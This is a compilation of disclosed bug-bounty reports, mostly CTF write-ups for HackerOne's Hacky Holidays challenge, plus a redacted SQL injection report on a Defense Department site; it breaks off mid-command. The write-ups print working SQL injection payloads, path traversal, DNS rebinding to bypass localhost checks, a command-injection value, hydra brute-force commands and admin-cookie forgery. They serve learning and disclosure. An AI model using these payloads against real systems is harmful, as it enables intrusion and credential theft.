| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
```
4.The server will calculate a valid ```hash``` for the aforementioned photos.
5.Then, this valid ```hash``` will be displayed on the HTML page.

My plan is to manipulate the output of the first SQL query, using the SQL Injection vulnerability, in such a manner that will affect the ```photo ``` value, which is then used by the server in its ```hash ``` calculation process.
More specifically, I want to gain full control over the ```photo ``` value, then I will be able to retrieve a valid ```hash``` from the server, without even knowing the algorithm :)

I started to manually test the SQL Injection vulnerability as you can see in the following pictures:

SQL Injection test:
{F1165601}
The number 3 is reflected back in the HTML page, which means the injection point is not 3rd column.

At this point, I noticed it is possible to exploit a Reflected XSS vulnerability, using SQL Injection :D
{F1165602}
It has nothing to do with the solution of this challenge.

I tried to manipulate the query by injecting another UNION operator, which will be used as the input of the 2nd SQL query, that I was looking to exploit, and it worked!
{F1165603}

The server calculated the hash for the input __123__:
{F1165604}

Lets break down my exploit:

```?hash=jdh34k'+AND+1=2+union+select+"'+union+select+null,null,'123'--+",2,3--+ ```

1.First, we are using the single quote ```' ``` character to breakout the original SQL query.
2.Then, we concatenate the AND operator with a false statement. we could also supply a wrong ```hash``` value, instead of using the AND operator.
3. We use the UNION operator and we are setting the first column to the following string:
```"'+union+select+null,null,'123'--+" ```

This string starts with a single quote character ```' ```, which will escape the 2nd SQL query. 
Also, the UNION operator is selecting three columns, as the second SQL query is expecting to get three columns results.
At the end of the second query injection there I added the ```--+" ``` characters due to the fact the we just escaped from the original second query and we don't want to "break" the syntax.
The quotes ```" ``` character is used to close the string of this injection payload (do not forget, we are injecting this payload by using another UNION operator).
Now, I just simply added the ```,2,3--+``` data, as part of the first UNION operator.

Right now, I had the ability to cryptographically sign arbitrary ```image``` file, but our input is concatenated to the ```/uploads/ ``` folder as you can see here:

```{"image":"r3c0n_server_4fdk59\/uploads\/123","auth":"80317c9bb75fec6949fd4e33b329e4a1"} ```

Well, I just used a Path Traversal ```../ ``` sequence in order to read access arbitrary endpoints.
First, I tried to access a resource, which is out of this challenge, for example the ```/assets/images/grinch-networks.png ```

Input:
```?hash=jdh34k'+AND+1=2+union+select+"'+union+select+null,null,'../../assets/images/grinch-networks.png'--+",2,3--+ ```

Output (base64 decoded):
```{"image":"r3c0n_server_4fdk59\/uploads\/..\/..\/assets\/images\/grinch-networks.png","auth":"e074528ae20d136249766f2cef6e3279"} ```

I accessed the following endpoint, and it worked :)
```/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC8uLlwvYXNzZXRzXC9pbWFnZXNcL2dyaW5jaC1uZXR3b3Jrcy5wbmciLCJhdXRoIjoiZTA3NDUyOGFlMjBkMTM2MjQ5NzY2ZjJjZWY2ZTMyNzkifQ== ```

So I started to manually search for ```/api/``` endpoints using this technique:

For example:
Input (inside the UNION operator):
```../api/test ```

Output:
```Expected HTTP status 200, Received: 404 ```

There is no ```/api/test``` endpoint, but, at least I managed to bypass this error message:
```{"error":"This endpoint cannot be visited from this IP address"} ```

After few attempts I had a hit!

Input (inside the UNION operator):
```../api/user ```

Output:
```Invalid content type detected ```

I started to look for HTTP GET parameters:

Input (inside the UNION operator):
```../api/user?a=a ```

Output:
```Expected HTTP status 200, Received: 400 ```

Notice the HTTP status is __400__ and not 404.
According to the ```/api``` endpoint, I could understand that I just need to find the right variable:
{F1165605}

Again, I manually searched for GET parameters:

Input (inside the UNION operator):
```../api/user?username= ```

Output:
```Expected HTTP status 200, Received: 204 ```

Input (inside the UNION operator):
```../api/user?password= ```

Output:
```Expected HTTP status 200, Received: 204 ```

Notice the HTTP status this time is __204__
{F1165606}

I found the following HTTP GET parameters:
1.username
2.password

I spent hours, trying to understand how I can exploit this, but nothing worked.
The next day, I had a desperate idea, what if the ```/api/user ``` endpoint is using the given username / password with a LIKE operator?.
If that is the case, I might be able to insert ```%``` as the username and as the password and that would return true.

Input (inside the UNION operator):
```../api/user?username=%%26password=% ```

Output:
```Invalid content type detected ```

__Note:__ The %26 is used as a URL encoded ampersand ```& ``` character due to the fact that our payload is sent in a URL context (the SQL Injection).

I worked! I finally got a different response than ```HTTP Status 204```.

I knew I can leak both the username and password using this "blind" technique. This time I created a simple python script to do that for me.
The script is attached to this writeup, and its name is recon.py

I wanted to find a shortcut, maybe I can guess the username.
I tried the following payload:

Input (inside the UNION operator):
```../api/user?username=grinch%%26password=% ```

Output:
```Invalid content type detected ```

it seems like the username starts with the string ```grinch ```, but I thought that I might have done something wrong so I added an ```a ``` character, as follows:

Input (inside the UNION operator):
```../api/user?username=grincha%%26password=% ```

Output:
```Invalid content type detected ```

It worked again!, how is that possible? I tried to add another ```a ``` character:

Input (inside the UNION operator):
```../api/user?username=grinchaa%%26password=% ```

Output:
```Expected HTTP status 200, Received: 204 ```

So the username really starts with the string grincha... what about grinchadmin?

Input (inside the UNION operator):
```../api/user?username=grinchadmin%%26password=% ```

Output:
```Invalid content type detected ```

The username starts with ```grinchadmin ``` :D
I checked if the username is equal to ```grinchadmin ``` by simply removing the ```% ``` character, so the string ```grinchadmin ``` must match the username in that database.

I executed my script (recon.py) and it slowly leaked the password:
{F1165607}

After few minutes I got the password: ```S4NT4SUCKS ```.
I tried to login using the credentials ```grinchadmin:S4NT4SUCKS ```, but it did not work... O_O
Then I just remembered that I do not know the leaked characters should be lowercase or uppercase.
I tried again with ```grinchadmin:s4nt4sucks ```, and it worked!
{F1165608}

Challenge 12 (Attack Box):
---------------------
__Tools I used:__ Burp Suite, hashcat, rbndr.us (DNS rebinding service).

This challenge starts with a page where we can choose a "hardcoded" target to attack.
Launching the attack on one of the targets, redirected me to ```/launch?payload= ``` endpoint.
{F1165611}

As you can see, the base64 encoded string contains a JSON format with 2 keys:
1.target
2.hash

Changing the the ```target``` value or the ```hash``` value, will fail with following error message:
```Invalid Protection Hash ```

Also, I noticed a cooldown mechanism, which forbids you from launching the attack again and again.
After playing a bit with the JSON formatI received the following error message:
```only one request per 15 seconds ```

This error message indicates that we should not focus on launching the attack which probably spams the server, but we should focus on something else.

Launching the attack redirected me to a specific page, which contained information regarding my attack:
{F1165612}

For example, this hash ```53d34f2e30d830e77deed8853fdb1038 ``` is related to the attack that I have just launched.
After my browser accessed the ```/attack-box/launch/53d34f2e30d830e77deed8853fdb1038 ``` URL, I noticed some requests (XHR) in my Burp Suite to ```/attack-box/launch/53d34f2e30d830e77deed8853fdb1038.json?id=49046 ```

I tried to tamper with every single parameter in the website, but it led me to nowhere.

I tried to understand what is the connection between these IP addresses to there corresponding ```hash ```:

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}
{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
```

These hashes might be a MD5 hash due to its length.
At some point I started to use an online service, which accepts a string and calculates various hashes for it, but the expected hash was not included in the results :(

I had a plan but I was not sure about it at all. My plan was to be able to calculate a hash for any given input, then I will set the target as ```127.0.0.1 ```, which should cause the system to attack itself :D, but maybe that is not the solution.

I had another idea, as you can see here:
{F1165613}

the hash in used as an argument to the ```ddos ``` binary. maybe I can generate such a hash that will be something like that:
```abc;ls; ```
then this command would be executed in the server:
```./ddos --load abc;ls;.target ```

As you can see, controlling the hash value may enable me to injection an OS command (RCE). but how is that possible to actually generate such a hash? might be impossible.

Back to plan 1:
I used the tool ```hashcat ``` in order to crack the hash, but first, the target IP must be used in some way in the process of the hash calculation.
I used the known ```rockyou.txt ``` wordlist, combined with the target IP:

First I created the file ```combine ```, which had this content:

```
203.0.113.33
203.0.113.53
203.0.113.213
```
Then, I used the ```combinator.bin ``` to concatenate each string within the ```rockyou.txt ``` file with each one of these IPs:

/usr/share/hashcat-utils/combinator.bin /root/Downloads/rockyou.txt combine > combined_wordlist.txt

The results are saved in the file ```combined_wordlist.txt ```. For example:
```
password203.0.113.33
password203.0.113.53
password203.0.113.213
iloveyou203.0.113.33
iloveyou203.0.113.53
iloveyou203.0.113.213
```
I launched the attack, and I knew it could be the opposite way - the IP might also be at the start of the string.

After few seconds it found the salt!
{F1165614}

The salt was:
```mrgrinch463 ```

Now I can generate a hash for any arbitrary input I want. I started with ```127.0.0.1 ``` as the input:
{F1165615}

I crafted the following JSON payload:
```{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"} ```
I base64 encoded it, and I sent the request, and it got accepted, it worked!. I checked the attack details:
{F1165616}

As you can see there is an additional protection mechanism which prevents me from being able to attack the localhost. At this point I started to try various techniques to attack the localhost without being detected:

1.I tried to represent the IP 127.0.0.1 as an octal - failed.
2.Representing the IP as hex - failed.
3.Tried to target ```vcap.me ``` domain, which points to ```127.0.0.1 ``` - failed.
4.Maybe IPv6? - failed.
5. 0.0.0.0 - did not fail, but did not work :D
6. Decimal representation - failed.

In case of sending a DNS as the target IP, the server attempts to resolve it twice.
{F1165617}

DNS Rebinding attack!

I used ```rbndr.us ```, which is an online service for DNS Rebinding.
We can send a specific DNS that holds 2 records. By doing so, we might be able to bypass the IP validation, in case IP validation occurs only for the first time, but then, the server might use the IP from the second time it resolves the DNS. 

My plan was to send a DNS which will point to ```8.8.8.8 ``` for the first resolve, and ```127.0.0.1 ``` for the second resolve. This must be it!

The DNS:
```08080808.7f000001.rbndr.us ```

I calculated the hash for this DNS and I sent the payload to the server, and it failed.
I tried several times and it failed, at this point I had no other ideas and I went to sleep.

The next day, I had a crazy idea:
What if I can pull out the internal server IP, using the previous challenge SQL Injection vulnerability and simply use that.
I exploited the Recon Server challenge again and I pulled out the hostname information.
Local IP: ```172.31.15.248 ```
I launched the attack but it was blocked:
{F1165618}

I tried the DNS Rebinding attack once again ```08080808.7f000001.rbndr.us ```, this time it worked :O
I also tried ```08080808.ac1f0ff8.rbndr.us ```, and it worked as well :D

The Final Flag:
---------------------

{F1129602}

---

### [SQL Injection in www.██████████](https://hackerone.com/reports/1015406)

- **Report ID:** `1015406`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @val_brux
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T21:58:41.797Z
- **CVE(s):** -

**Vulnerability Information:**

##Description:
SQL Injection is a vulnerability which allows interference with the queries performed on a database, to obtain sensitive information which could be really useful to attackers. A web application database is often queried using user-requests parameters, which when are not properly sanitized can be modified injecting malicious code.  In this case, the vulnerable endpoint is http://www.████████ and the vulnerable parameter is the POST rnum parameter. Respecting the program guidelines, I performed the minimal amount of testing required to prove that a vulnerability existed, but please tell me if I can bring the exploitation further to give more information.

##Reproduction steps
1 -Repeat the below requests with a interceptor proxy (for example, using Burp).
```
POST ████ HTTP/1.1
Host: www.████
Content-Length: 72
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.███████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://www.███████████
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7
Cookie: PHPSESSID=█████
Connection: close

███████
```
```
POST ██████████ HTTP/1.1
Host: www.███████
Content-Length: 72
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.█████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://www.████████████████
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7
Cookie: PHPSESSID=████
Connection: close

█████
```
In the first case, the record obtained from the database is the following:
```
██████
```
██████
Whilst in the second case, the record obtained is:
```
███
```
█████
This confirms that the OFFSET clause is concatenated to the original query and there is the possibility to exploit a SQL Injection.

## Impact

The vulnerability could allow an attacker to dump sensitive and personal data from the web application database (such as usernames and password hashes) or to perform authentication bypasses.

---

### [First CTF ever!](https://hackerone.com/reports/1069263)

- **Report ID:** `1069263`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** h1-ctf
- **Reporter:** @eliee
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T17:55:33.038Z
- **CVE(s):** -

**Vulnerability Information:**

# Pretext
Started looking into hacking this autumn and then found out HackerOne was doing a Christmas themed CTF. Further investigation showed that the deplorable Grinch might be up to no good again - Christmas is in danger!

# TLDR
Lots of hacking took place, the Grinch was stopped, Christmas saved and all I got for the trouble was these flags (and lots of invites but no Snow Ball Launcher):
```text
flag{48104912-28b0-494a-9995-a203d1e261e7}
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
flag{99309f0f-1752-44a5-af1e-a03e4150757d}
flag{07a03135-9778-4dee-a83c-7ec330728e72}
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
```

## First look
A first look at the domain in scope (https://hackyholidays.h1ctf.com/) for the CTF reveals the Grinch network's front to the world, a homepage with nothing but a picture.

{F1138471}

Taking a quick look at `https://hackyholidays.h1ctf.com/robots.txt` to see if there's anything they don't want robots (us) to see, we find the first flag `flag{48104912-28b0-494a-9995-a203d1e261e7}` and that bots aren't allowed to index `/s3cr3t-ar3a`.

## Secret area
The supposedly secret area of the Grinch doesn't really give a lot of information other than it has been moved to another secure location in order to "Keep people out". 
(https://hackyholidays.h1ctf.com/s3cr3t-ar3a)
{F1138470}

Inspecting the page with Chrome's developer tools reveals the second flag `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`, hidden in a div tag:
{F1138472}

This flag is not visible in the HTML returned by the HTTP request to /s3cr3t-ar3a so it must be hidden in JavaScript somewhere. Further investigation reveals a script tag loading `https://hackyholidays.h1ctf.com/assets/js/jquery.min.js` and inside, we find  the following code:

```javascript
		h1_0 = 'la'
      , h1_1 = '}'
      , h1_2 = ''
      , h1_3 = 'f'
      , h1_4 = 'g'
      , h1_5 = '{b7ebcb75'
      , h1_6 = '8454-'
      , h1_7 = 'cfb9574459f7'
      , h1_8 = '-9100-4f91-';
    document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
```

Running just the variables `h1_0` through `h1_8` in `console.log` gives us the flag:
```javascript
console.log( h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
// flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
```

The very same page also provides a hint at which the next page will be:
```javascript
document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```

## next-page - /apps
The `/apps` endpoint currently (as of writing) provides us with a list of 8 different challenges presented as separate apps. The page itself doesn't hold any flags or vulnerabilities.

(https://hackyholidays.h1ctf.com/apps)

## /people-rater - the third flag
The first of the apps is the "Grinch People Rater". It provides a list of names which, when clicked, presents the Grinch's opinion on that particular person.

{F1138473}

{F1138474}

Inspecting the webpage tells us that each and every button has an associated data-id attribute. Tea Avery, for example, has the id `eyJpZCI6Mn0=`. Hmm, looks like base64 - let's have a look!

```javascript
atob('eyJpZCI6Mn0=');
```
```json
{
  "id":2
}
```

Oh, nice, a JSON-object providing us with an id, makes sense that it star... wait a minute. Why would it start with id 2? Who is id 1? Just have to check! Enter the following into the browser's console:

```javascript
// encode {"id":1}
const o = btoa('{"id":1}');
// eyJpZCI6MX0=
```

Now, how are people fetched? Source inspection tells us a request is made to `https://hackyholidays.h1ctf.com/people-rater/entry?id=IDHERE`
Let's plug our encoded object into it and see what it returns!
```javascript
fetch(`https://hackyholidays.h1ctf.com/people-rater/entry?id=${o}`).then(d => d.text()).then(d => console.log(d));
```
```JSON
{
  "id":"eyJpZCI6MX0=",
  "name":"The Grinch",
  "rating":"Amazing in every possible way!",
  "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```

Sweet, the third flag is `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`!

## /swag-shop - the fourth flag
Ah, the swag-shop - I wonder who'd actually be shopping from here. They have only three items, none of them with pictures, and while the 'Snow Ball Launcher' does appeal to me, $395 seems rather steep...

{F1138475}

That said, let's try purchasing it! Wait, I need to log in to buy it?
{F1138477}

No way to register a user, no obvious credentials work... Hmm. Let's look at the source, then - I want that launcher!

The source code reveals there is some sort of API at `https://hackyholidays.h1ctf.com/swag-shop/api/` as the page pulls stock from `https://hackyholidays.h1ctf.com/swag-shop/api/stock`. There's also `https://hackyholidays.h1ctf.com/swag-shop/api/login` and  `https://hackyholidays.h1ctf.com/swag-shop/api/purchase`. Neither seem to want to accept my money so let's break out the fuzzer and see what other endpoints are available to us.

```bash
ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w 
seclists/Discovery/Web-Content/common.txt
```

Reveals another, previously unknown, endpoint: `https://hackyholidays.h1ctf.com/swag-shop/api/sessions`

Accessing the `/sessions` endpoint gives us a JSON object with quite a few sessions:

```JSON
{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
```

They all seem to be base64 encoded, let's have a look at the first one:
```javascript
atob("eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=");
// {"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}"
```

Hmm, a null user... Doing this by hand seems like a chore, let's automate it:
```javascript
fetch("https://hackyholidays.h1ctf.com/swag-shop/api/sessions")
  .then(d => d.json())
  .then(d => {
    d.sessions.forEach(obj => {
      console.log(atob(obj))
    })
  });
```

Result:
```JSON
{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}
{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}
{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}
{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}
{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}
{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}
```

Aha, a valid user by the looks of it - `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`! But it doesn't give us a proper username, and the cookie property seems to decode into a hash... Maybe we can use the user id? And since it so sincerely tells us "user", maybe there is a `https://hackyholidays.h1ctf.com/swag-shop/api/user` endpoint?
{F1138476}

Look at that! Now, what might the actual parameter be? user, id, userid, username? Nope:
{F1138478}

Thinking about it, the user"name" returned by `https://hackyholidays.h1ctf.com/swag-shop/api/sessions` does look more like a UUID than a name or regular id... maybe `uuid` will work? 
[Link](https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043)
{F1138479}

```JSON
{
	"uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
	"username": "grinch",
	"address": {
		"line_1": "The Grinch",
		"line_2": "The Cave",
		"line_3": "Mount Crumpit",
		"line_4": "Whoville"
	},
	"flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

Sweet, the fouth flag `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`! Unfortunately, it doesn't seem like it will let us buy a Snow Ball Launcher - better stop the Grinch and ask Santa for one!

## /secure-login - the fifth flag
We are greeted with a page that fits the location to a T.
{F1138480}

And yet again, no way to sign up >:( Maybe there's some hidden sign up page... Apparently not - fuzzing reveals nothing of interest. Let's try logging in, then!
`test:test`
{F1138481}

No dice, go... Wait, *username* doesn't exist? Perhaps it will tell us when we find a proper username, let's try running hydra.
```bash
hydra -L /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -p wot 18.216.153.32 https-post-form '/secure-login:username=^USER^&password=^PASS^:Invalid Username'
[...]
[443][http-post-form] host: 18.216.153.32   login: access   password: wot
```

Nice, seems the page properly informs us that the username `access` is valid by saying the password is incorrect:
{F1138485}

Let's use hydra again to see if we can get the password too:
```bash
hydra -l access -P /usr/share/wordlists/rockyou.txt 18.216.153.32 https-post-form '/secure-login:username=^USER^&password=^PASS^:Invalid Password'
[443][http-post-form] host: 18.216.153.32   login: access   password: computer
1 of 1 target successfully completed, 1 valid password found
```
Bingo, `computer`. After logging in using `access:computer` as credentials, we are greeted with the following, very informative, message:
{F1138486}

Looking at the source also gives us nothing, but I noticed that the cookie in the HTTP request seems to be a base64 encoded value:

{F1138488}

```javascript
atob(decodeURIComponent("eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D"));
// {"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

Apparently, we don't have admin privileges... But it does look like we can change that:
```javascript
encodeURIComponent(btoa('{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}'));
// eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3D%3D
```

Using Burp, we send the request for `https://hackyholidays.h1ctf.com/secure-login` to the repeater and change the value of the `securelogin` cookie to our new forged JSON object before hitting `Send`:
{F1138487}

Seems there's a hidden zip-file that the Grinch doesn't want us to have! Let's get it from [here](https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip)!

Opening the file, it turns out it has been password protected:
{F1138490}

Surely, this is nothing before the might of John the Ripper, particularly since we'll be cracking locally!

First, we'll need to convert it to a format that John can understand.
```bash
zip2john my_secure_files_not_for_you.zip > zippass.txt
```

Next, let John loose on the hash retrieved from the zip-file, using the infamous password list `rockyou.txt`! 
```bash
